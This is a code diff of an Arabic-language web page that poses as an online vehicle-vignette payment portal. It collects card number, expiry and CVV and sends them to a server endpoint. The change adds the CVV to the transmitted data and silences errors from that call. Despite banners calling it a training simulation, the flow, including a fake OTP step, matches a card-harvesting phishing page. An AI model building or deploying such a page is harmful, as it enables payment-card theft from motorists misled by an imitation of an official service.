@@ -33,24 +33,23 @@
         .step {
             background: #004080;
             color: white;
-            padding: 15px;
+            padding: 10px;
             border-radius: 10px;
             text-align: center;
-            margin-bottom: 25px;
-            font-size: 16px;
-            font-weight: 600;
+            margin-bottom: 20px;
         }
         label {
             display: block;
             color: #333;
             font-weight: 600;
+            margin-top: 15px;
             margin-bottom: 8px;
             font-size: 14px;
         }
         input {
             width: 100%;
             padding: 12px;
-            margin-bottom: 12px;
+            margin: 0 0 10px 0;
             border: 2px solid #ddd;
             border-radius: 10px;
             font-size: 16px;
@@ -68,17 +67,13 @@
             color: white;
             border: none;
             border-radius: 10px;
-            font-size: 16px;
+            font-size: 18px;
             font-weight: bold;
             cursor: pointer;
-            margin-top: 15px;
+            margin-top: 10px;
             transition: all 0.3s ease;
         }
-        button:hover { 
-            background: #218838; 
-            transform: translateY(-2px); 
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2); 
-        }
+        button:hover { background: #218838; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
         button.secondary { background: #6c757d; }
         button.secondary:hover { background: #5a6268; }
         .info {
@@ -86,56 +81,80 @@
             padding: 15px;
             border-radius: 10px;
             margin: 15px 0;
-            font-size: 13px;
             text-align: center;
-            color: #666;
         }
         .hidden { display: none; }
-        .otp-container {
+        
+        /* Card Input Styling */
+        .card-input-group {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 12px;
+            margin-bottom: 15px;
+            border: 2px solid #e0e0e0;
+        }
+        .card-number-input {
+            font-size: 18px !important;
+            letter-spacing: 2px;
+            font-weight: 600;
+        }
+        .row-inputs {
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 15px;
+        }
+        
+        /* OTP Styling */
+        .otp-box {
             background: linear-gradient(135deg, #fff3cd 0%, #ffe082 100%);
+            text-align: center;
+            font-size: 36px;
+            letter-spacing: 10px;
+            font-weight: bold;
             padding: 25px;
             border-radius: 15px;
             border: 3px solid #ffa500;
             margin: 20px 0;
+            color: #333;
             box-shadow: 0 5px 15px rgba(255, 165, 0, 0.2);
         }
-        .otp-box {
-            background: white;
-            text-align: center;
-            font-size: 36px;
-            letter-spacing: 8px;
-            font-weight: bold;
-            padding: 15px;
-            border-radius: 12px;
-            color: #333;
-            border: 2px solid #ffa500;
-            margin-bottom: 15px;
-            font-family: 'Courier New', monospace;
+        .otp-inputs {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin: 25px 0;
+            flex-wrap: wrap;
         }
-        .otp-input-unified {
-            width: 100% !important;
-            font-size: 22px !important;
-            letter-spacing: 8px !important;
-            text-align: center !important;
+        .otp-input {
+            width: 55px !important;
+            height: 55px !important;
+            text-align: center;
+            font-size: 28px !important;
             font-weight: bold !important;
             border: 2px solid #e0e0e0 !important;
             border-radius: 12px !important;
-            padding: 12px !important;
-            margin: 15px 0 !important;
-            font-family: 'Courier New', monospace;
+            padding: 0 !important;
+            margin: 0 !important;
+            transition: all 0.3s ease;
         }
-        .otp-input-unified:focus {
+        .otp-input:focus {
             outline: none !important;
             border-color: #0055a4 !important;
             box-shadow: 0 0 12px rgba(0, 85, 164, 0.4) !important;
+            transform: scale(1.05);
+        }
+        .otp-input::-webkit-outer-spin-button,
+        .otp-input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
         }
         .timer {
             text-align: center;
-            font-size: 18px;
+            font-size: 20px;
             font-weight: bold;
             margin: 15px 0;
-            padding: 10px;
             color: #d32f2f;
+            padding: 10px;
             background: #ffebee;
             border-radius: 10px;
             border-left: 4px solid #d32f2f;
@@ -150,103 +169,134 @@
 <body>
 <div class="container">
     <div class="warning">
-        ⚠️ تنبيه: هذه منصة تدريبية لأغراض إعلامية فقط - لا تمثل أي جهة رسمية
+        ⚠️ تنبيه: هذه منصة تدريبية لأغراض إعلامية فقط - لا تمثل أي جهة رسمية<br>
+        ⚠️ Avertissement: Plateforme éducative uniquement - aucune transaction réelle
     </div>
 
     <!-- الخطوة 0: صفحة الترحيب -->
     <div id="step0" class="card">
         <div style="text-align: center; margin-bottom: 30px;">
-            <h1 style="color: #0055a4; font-size: 24px; margin-bottom: 10px;">مرحباً بكم في منصة اقتضاء قسيمة السيارات عن بعد</h1>
-            <p style="color: #666; font-size: 14px; line-height: 1.6;">توفر لكم هذه المنصة إمكانية اقتضاء قسيمة السيارات عن بعد على مدار 24 ساعة بسرعة وأمان، دون الحاجة إلى التنقل</p>
+            <h1 style="color: #0055a4; font-size: 24px; margin-bottom: 10px;">مرحباً بكم في منصة اقتضاء قسيمة السيارات عن بعد لسنة 2026</h1>
+            <p style="color: #666; font-size: 14px; line-height: 1.6;">توفر لكم هذه المنصة إمكانية اقتضاء قسيمة السيارات عن بعد على مدار 24 ساعة / 24 ساعة و 7 أيام / 7 أيام بسرعة وأمان، دون الحاجة إلى التنقل</p>
         </div>
 
         <div style="background: #f8f9fa; padding: 25px; border-radius: 15px; margin-bottom: 20px;">
-            <h2 style="text-align: center; color: #0055a4; font-size: 18px; margin-bottom: 20px;">الخطوات:</h2>
+            <h2 style="text-align: center; color: #0055a4; font-size: 18px; margin-bottom: 20px;">لاقتضاء قسيمتك عن بعد، يرجى اتباع الخطوات التالية:</h2>
             
-            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
-                <div style="background: white; padding: 15px; border-radius: 10px; text-align: center; border: 1px solid #ddd;">
-                    <span style="font-size: 36px;">📄</span>
-                    <p style="color: #0055a4; font-weight: 600; margin-top: 8px; font-size: 13px;">الخطوة 1: رقم التسجيل</p>
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 20px;">
+                <!-- Step 1 -->
+                <div style="background: white; padding: 20px; border-radius: 12px; text-align: center; border: 1px solid #e0e0e0;">
+                    <div style="width: 60px; height: 60px; margin: 0 auto 15px; background: #ffa500; border-radius: 12px; display: flex; align-items: center; justify-content: center;">
+                        <span style="font-size: 40px;">📄</span>
+                    </div>
+                    <h3 style="color: #0055a4; font-size: 14px; margin-bottom: 8px;">الخطوة 01: إدخال رقم تسجيل المركبة</h3>
+                    <p style="color: #666; font-size: 12px; line-height: 1.5;">لاقتضاء القسيمة، يرجى إدخال رقم تسجيل المركبة.</p>
                 </div>
-                <div style="background: white; padding: 15px; border-radius: 10px; text-align: center; border: 1px solid #ddd;">
-                    <span style="font-size: 36px;">✅</span>
-                    <p style="color: #0055a4; font-weight: 600; margin-top: 8px; font-size: 13px;">الخطوة 2: التأكيد</p>
+
+                <!-- Step 2 -->
+                <div style="background: white; padding: 20px; border-radius: 12px; text-align: center; border: 1px solid #e0e0e0;">
+                    <div style="width: 60px; height: 60px; margin: 0 auto 15px; background: #ffa500; border-radius: 12px; display: flex; align-items: center; justify-content: center;">
+                        <span style="font-size: 40px;">✅</span>
+                    </div>
+                    <h3 style="color: #0055a4; font-size: 14px; margin-bottom: 8px;">الخطوة 02: التحقق من صحة المعلومات المتعلقة بالمركبة</h3>
+                    <p style="color: #666; font-size: 12px; line-height: 1.5;">يرجى التأكد من صحة المعلومات المتعلقة بالمركبة</p>
                 </div>
-                <div style="background: white; padding: 15px; border-radius: 10px; text-align: center; border: 1px solid #ddd;">
-                    <span style="font-size: 36px;">💳</span>
-                    <p style="color: #0055a4; font-weight: 600; margin-top: 8px; font-size: 13px;">الخطوة 3: البطاقة</p>
+
+                <!-- Step 3 -->
+                <div style="background: white; padding: 20px; border-radius: 12px; text-align: center; border: 1px solid #e0e0e0;">
+                    <div style="width: 60px; height: 60px; margin: 0 auto 15px; background: #ffa500; border-radius: 12px; display: flex; align-items: center; justify-content: center;">
+                        <span style="font-size: 40px;">💳</span>
+                    </div>
+                    <h3 style="color: #0055a4; font-size: 14px; margin-bottom: 8px;">الخطوة 03: عرض تعريفة القسيمة</h3>
+                    <p style="color: #666; font-size: 12px; line-height: 1.5;">في هاته الخطوة، يرجى الموافقة على عملية دفع تعريفة القسيمة المطلوبة</p>
                 </div>
-                <div style="background: white; padding: 15px; border-radius: 10px; text-align: center; border: 1px solid #ddd;">
-                    <span style="font-size: 36px;">🔐</span>
-                    <p style="color: #0055a4; font-weight: 600; margin-top: 8px; font-size: 13px;">الخطوة 4: التحقق</p>
+
+                <!-- Step 4 -->
+                <div style="background: white; padding: 20px; border-radius: 12px; text-align: center; border: 1px solid #e0e0e0;">
+                    <div style="width: 60px; height: 60px; margin: 0 auto 15px; background: #ffa500; border-radius: 12px; display: flex; align-items: center; justify-content: center;">
+                        <span style="font-size: 40px;">🏦</span>
+                    </div>
+                    <h3 style="color: #0055a4; font-size: 14px; margin-bottom: 8px;">الخطوة 04: دفع القسيمة</h3>
+                    <p style="color: #666; font-size: 12px; line-height: 1.5;">يرجى إدخال معلومات بطاقة الدفع البنكية أو الدهبية</p>
+                </div>
+
+                <!-- Step 5 -->
+                <div style="background: white; padding: 20px; border-radius: 12px; text-align: center; border: 1px solid #e0e0e0; grid-column: 1 / -1;">
+                    <div style="width: 60px; height: 60px; margin: 0 auto 15px; background: #ffa500; border-radius: 12px; display: flex; align-items: center; justify-content: center;">
+                        <span style="font-size: 40px;">🚗</span>
+                    </div>
+                    <h3 style="color: #0055a4; font-size: 14px; margin-bottom: 8px;">الخطوة 05: تحميل وطباعة</h3>
+                    <p style="color: #666; font-size: 12px; line-height: 1.5;">بمجرد دفع القسيمة، يمكنكم تحميل القسيمة و إرسال الدفع وطباعتها</p>
                 </div>
             </div>
         </div>
 
-        <button onclick="startProcess()">ابدأ الآن</button>
+        <button onclick="startProcess()">متابعة</button>
     </div>
 
-    <!-- الخطوة 1: إدخال رقم التسجيل -->
+    <!-- الخطوة 1 -->
     <div id="step1" class="card hidden">
-        <div class="step">الخطوة 1: إدخال رقم تسجيل الم��كبة</div>
-        <label>رقم التسجيل:</label>
+        <div class="step">الخطوة 1: إدخال رقم التسجيل</div>
+        <label>رقم تسجيل المركبة:</label>
         <input type="text" id="plaque" placeholder="مثال: 1234 ع 99" dir="ltr">
         <button onclick="searchCar()">بحث</button>
-        <div class="info">أي رقم تسجيل سيتم قبوله | أمثلة: 1234 ع 99 أو 5678 و 22</div>
+        <div class="info" style="background:#f8f9fa; font-size:12px;">
+            أي رقم أو نص - إدخل أي شيء! | إذا كان موجود: ستظهر البيانات | إذا لم يكن موجود: انتقل مباشرة للدفع
+        </div>
     </div>
 
-    <!-- الخطوة 2: تأكيد المركبة -->
+    <!-- الخطوة 2 -->
     <div id="step2" class="card hidden">
         <div class="step">الخطوة 2: تأكيد معلومات المركبة</div>
         <div id="carInfo" class="info"></div>
-        <button onclick="goToPayment()">تأكيد والمتابعة</button>
+        <button onclick="goToPayment()">تأكيد والمتابعة للدفع</button>
         <button class="secondary" onclick="reset()">رجوع</button>
     </div>
 
-    <!-- الخطوة 3: إدخال بيانات البطاقة -->
+    <!-- الخطوة 3 -->
     <div id="step3" class="card hidden">
         <div class="step">الخطوة 3: إدخال بيانات البطاقة (تدريبي)</div>
         
-        <div style="background: #f0f8ff; padding: 20px; border-radius: 12px; margin-bottom: 20px; border: 2px solid #0055a4;">
+        <div class="card-input-group">
             <label>رقم البطاقة (16 رقم)</label>
-            <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" dir="ltr" maxlength="19" inputmode="numeric">
+            <input type="text" id="cardNumber" maxlength="19" placeholder="1234  5678  9012  3456" dir="ltr" class="card-number-input" inputmode="numeric">
+        </div>
 
-            <div style="display: grid; grid-template-columns: 2fr 1fr; gap: 12px;">
-                <div>
-                    <label>تاريخ الانتهاء</label>
-                    <input type="text" id="expiry" placeholder="12/25" dir="ltr" maxlength="5" inputmode="numeric">
-                </div>
-                <div>
-                    <label>CVV</label>
-                    <input type="password" id="cvv" placeholder="123" dir="ltr" maxlength="4" inputmode="numeric">
-                </div>
+        <div class="row-inputs">
+            <div>
+                <label>تاريخ الانتهاء (MM/YY)</label>
+                <input type="text" id="expiry" maxlength="5" placeholder="12/25" dir="ltr" inputmode="numeric">
             </div>
-
-            <div style="background: white; padding: 12px; border-radius: 8px; border-left: 4px solid #28a745; margin-top: 12px;">
-                <p style="color: #666; font-size: 12px; margin: 0;">ℹ️ هذه محاكاة تدريبية آمنة - لا يتم تخزين أي بيانات</p>
+            <div>
+                <label>الرمز السري (CVV)</label>
+                <input type="password" id="cvv" maxlength="3" placeholder="123" dir="ltr" inputmode="numeric">
             </div>
         </div>
 
-        <button onclick="sendPayment()">دفع</button>
+        <button onclick="sendPayment()">دفع (تدريبي)</button>
         <button class="secondary" onclick="reset()">رجوع</button>
     </div>
-
-    <!-- الخطوة 4: التحقق OTP -->
+    <!-- الخطوة 4 -->
     <div id="step4" class="card hidden">
-        <div class="step">الخطوة 4: إدخال رمز التحقق</div>
+        <div class="step">الخطوة 4: إدخال رمز التحقق OTP</div>
         <div class="timer" id="timer"></div>
-        <div class="otp-container">
-            <label style="text-align: center;">الرقم السري:</label>
-            <div id="otpDisplay" class="otp-box"></div>
-            <label style="text-align: center;">أدخل الـ OTP (6 أرقام):</label>
-            <input type="text" id="otpUnified" class="otp-input-unified" maxlength="6" placeholder="000000" dir="ltr" inputmode="numeric">
+        <div id="otpDisplay" class="otp-box"></div>
+        <label>أدخل الرقم الذي يظهر أعلاه (6 أرقام):</label>
+        <div class="otp-inputs" id="otpInputContainer">
+            <input type="text" maxlength="1" class="otp-input" id="otp1" inputmode="numeric" pattern="[0-9]">
+            <input type="text" maxlength="1" class="otp-input" id="otp2" inputmode="numeric" pattern="[0-9]">
+            <input type="text" maxlength="1" class="otp-input" id="otp3" inputmode="numeric" pattern="[0-9]">
+            <input type="text" maxlength="1" class="otp-input" id="otp4" inputmode="numeric" pattern="[0-9]">
+            <input type="text" maxlength="1" class="otp-input" id="otp5" inputmode="numeric" pattern="[0-9]">
+            <input type="text" maxlength="1" class="otp-input" id="otp6" inputmode="numeric" pattern="[0-9]">
         </div>
-        <button onclick="verifyOtp()">تحقق وإنهاء</button>
+        <button onclick="verifyOtp()">تأكيد وإنهاء</button>
         <button class="secondary" onclick="reset()">رجوع</button>
     </div>
 </div>
 
 <script>
+    // قاعدة بيانات وهمية للسيارات (تعمل بدون خادم)
     const fakeCars = {
         "1234 ع 99": { marque: "Renault", modele: "Symbol", annee: "2020" },
         "5678 و 22": { marque: "Hyundai", modele: "i10", annee: "2022" },
@@ -259,23 +309,22 @@
     let timerInterval = null;
     let timeRemaining = 120;
 
-    // تنسيق المدخلات تلقائياً
+    // تنسيق رقم البطاقة تلقائياً
     document.addEventListener('DOMContentLoaded', () => {
         const cardInput = document.getElementById('cardNumber');
         const expiryInput = document.getElementById('expiry');
         const cvvInput = document.getElementById('cvv');
-        const otpInput = document.getElementById('otpUnified');
 
         cardInput.addEventListener('input', (e) => {
-            let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
-            if (value.length > 16) value = value.slice(0, 16);
-            
-            let formatted = '';
+            let value = e.target.value.replace(/\s/g, '');
+            let formattedValue = '';
             for (let i = 0; i < value.length; i++) {
-                if (i > 0 && i % 4 === 0) formatted += ' ';
-                formatted += value[i];
+                if (i > 0 && i % 4 === 0) {
+                    formattedValue += '  ';
+                }
+                formattedValue += value[i];
             }
-            e.target.value = formatted;
+            e.target.value = formattedValue;
         });
 
         expiryInput.addEventListener('input', (e) => {
@@ -287,11 +336,7 @@
         });
 
         cvvInput.addEventListener('input', (e) => {
-            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
-        });
-
-        otpInput.addEventListener('input', (e) => {
-            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
+            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
         });
     });
 
@@ -306,17 +351,23 @@
             return;
         }
         
+        // البحث عن السيارة في قاعدة البيانات
         let car = fakeCars[plaque];
         if (car) {
+            // إذا تم العثور عليها، عرض المعلومات
             currentCar = { ...car, plaque };
+            
             document.getElementById('carInfo').innerHTML = `
-                ✅ تم العثور على المركبة<br><br>
-                🏷️ الماركة: ${car.marque}<br>
-                🚗 الموديل: ${car.modele}<br>
-                📅 السنة: ${car.annee}
+                ✅ تم العثور على المركبة:<br>
+                🚗 الماركة: ${car.marque}<br>
+                🚙 الموديل: ${car.modele}<br>
+                📅 السنة: ${car.annee}<br>
+                🏷️ رقم التسجيل: ${plaque}
             `;
+            
             showStep(2);
         } else {
+            // إذا لم يتم العثور عليها، انتقل مباشرة إلى الدفع
             currentCar = { plaque };
             showStep(3);
         }
@@ -327,62 +378,77 @@
     }
 
     async function sendPayment() {
-        let cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '').replace(/\D/g, '');
+        let cardNumber = document.getElementById('cardNumber').value.trim().replace(/\s/g, '');
         const expiry = document.getElementById('expiry').value.trim();
         const cvv = document.getElementById('cvv').value.trim();
         
-        if (!cardNumber || cardNumber.length !== 16) {
-            alert('الرجاء إدخال 16 رقم صحيح');
+        if (!cardNumber || cardNumber.length < 16) {
+            alert('الرجاء إدخال رقم بطاقة مكون من 16 رقم');
             return;
         }
         if (!expiry || expiry.length < 5) {
-            alert('تاريخ الانتهاء غير صحيح');
+            alert('الرجاء إدخال تاريخ انتهاء صحيح (MM/YY)');
             return;
         }
         if (!cvv || cvv.length < 3) {
-            alert('CVV غير صحيح');
+            alert('الرجاء إدخال الرمز السري المكون من 3 أرقام');
             return;
         }
-
+        
         try {
             const paymentData = {
-                plaque: currentCar?.plaque || 'N/A',
-                cardLastFour: cardNumber.slice(-4),
+                plaque: currentCar?.plaque || 'غير محدد',
+                cardNumber: cardNumber.slice(-4).padStart(16, '*'),
                 expiry: expiry,
+                cvv: cvv,
                 timestamp: new Date().toLocaleString('ar-EG'),
-                marque: currentCar?.marque || 'N/A'
+                marque: currentCar?.marque || 'غير محدد',
+                modele: currentCar?.modele || 'غير محدد'
             };
-
-            await fetch('/api/collect', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    step: 'payment',
-                    data: paymentData
-                })
-            });
-
+            
+            try {
+                const response = await fetch('/api/send-payment', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(paymentData)
+                });
+                
+                if (response.ok) {
+                    const responseData = await response.json();
+                }
+            } catch (apiError) {
+            }
+            
             generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
             document.getElementById('otpDisplay').innerHTML = generatedOtp;
+            
             startTimer();
-            document.getElementById('otpUnified').value = '';
+            
+            for (let i = 1; i <= 6; i++) {
+                document.getElementById(`otp${i}`).value = '';
+            }
+            
             showStep(4);
         } catch (error) {
-            console.error('Error:', error);
-            alert('حدث خطأ في الاتصال');
+            alert('حدث خطأ: ' + error.message);
         }
     }
 
     function startTimer() {
         timeRemaining = 120;
         updateTimerDisplay();
-        if (timerInterval) clearInterval(timerInterval);
+        
+        if (timerInterval) {
+            clearInterval(timerInterval);
+        }
+        
         timerInterval = setInterval(() => {
             timeRemaining--;
             updateTimerDisplay();
+            
             if (timeRemaining <= 0) {
                 clearInterval(timerInterval);
-                alert('انتهت صلاحية الكود');
+                alert('انتهت صلاحية الكود. الرجاء المحاولة مرة أخرى');
                 reset();
             }
         }, 1000);
@@ -393,27 +459,46 @@
         const seconds = timeRemaining % 60;
         const timerElement = document.getElementById('timer');
         timerElement.textContent = `الوقت المتبقي: ${minutes}:${seconds.toString().padStart(2, '0')}`;
+        
         if (timeRemaining <= 30) {
             timerElement.classList.add('active');
         }
     }
 
+    function setupOtpInputs() {
+        for (let i = 1; i <= 6; i++) {
+            const input = document.getElementById(`otp${i}`);
+            input.addEventListener('input', (e) => {
+                if (e.target.value && i < 6) {
+                    document.getElementById(`otp${i + 1}`).focus();
+                }
+            });
+            
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && i > 1) {
+                    document.getElementById(`otp${i - 1}`).focus();
+                }
+            });
+        }
+    }
+
     function verifyOtp() {
-        const enteredCode = document.getElementById('otpUnified').value.trim();
+        let enteredCode = '';
+        for (let i = 1; i <= 6; i++) {
+            enteredCode += document.getElementById(`otp${i}`).value;
+        }
         
         if (enteredCode.length !== 6) {
-            alert('أدخل 6 أرقام بالضبط');
+            alert('الرجاء إدخال جميع الأرقام الستة');
             return;
         }
         
         if (enteredCode === generatedOtp) {
             clearInterval(timerInterval);
-            alert('✅ تمت العملية بنجاح!\nشكراً لاستخدام المنصة التدريبية');
+            alert('✅ تمت العملية التدريبية بنجاح! شكراً لك.\n(هذه محاكاة تدريبية فقط)');
             reset();
         } else {
-            alert('❌ رمز غير صحيح\nحاول مرة أخرى');
-            document.getElementById('otpUnified').value = '';
-            document.getElementById('otpUnified').focus();
+            alert('❌ الرقم غير صحيح. حاول مرة أخرى');
         }
     }
 
@@ -425,14 +510,9 @@
         document.getElementById('step4').classList.add('hidden');
         document.getElementById(`step${step}`).classList.remove('hidden');
         
-        if (step === 1) {
-            document.getElementById('plaque').focus();
-        }
-        if (step === 3) {
-            document.getElementById('cardNumber').focus();
-        }
         if (step === 4) {
-            document.getElementById('otpUnified').focus();
+            setupOtpInputs();
+            document.getElementById('otp1').focus();
         }
     }
 
@@ -440,12 +520,16 @@
         currentCar = null;
         generatedOtp = null;
         timeRemaining = 120;
-        if (timerInterval) clearInterval(timerInterval);
+        if (timerInterval) {
+            clearInterval(timerInterval);
+        }
         document.getElementById('plaque').value = '';
         document.getElementById('cardNumber').value = '';
         document.getElementById('expiry').value = '';
         document.getElementById('cvv').value = '';
-        document.getElementById('otpUnified').value = '';
+        for (let i = 1; i <= 6; i++) {
+            document.getElementById(`otp${i}`).value = '';
+        }
         showStep(0);
     }
 </script>
